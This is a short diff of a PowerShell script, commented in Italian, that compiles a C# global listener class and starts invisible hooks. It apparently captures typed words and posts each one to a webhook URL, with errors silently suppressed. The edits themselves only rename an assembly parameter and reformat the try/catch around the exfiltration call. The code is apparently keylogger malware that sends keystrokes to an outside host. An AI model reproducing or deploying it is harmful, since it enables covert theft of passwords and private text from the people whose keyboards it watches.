@@ -118,12 +118,14 @@ public class GlobalListener {
         }
     }
 }
-"@ -ReferencedAssemblies "System.Windows.Forms"
+"@ -AssemblyName "System.Windows.Forms"
 
 # --- Callback PowerShell: invia parola al webhook ---
 [GlobalListener]::Callback = [System.Action[string]]{
     param($msg)
-    try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $msg } | ConvertTo-Json) -ContentType 'application/json' } catch {}
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $msg } | ConvertTo-Json) -ContentType 'application/json'
+    } catch {}
 }
 
 # --- Avvio dei hook invisibili ---
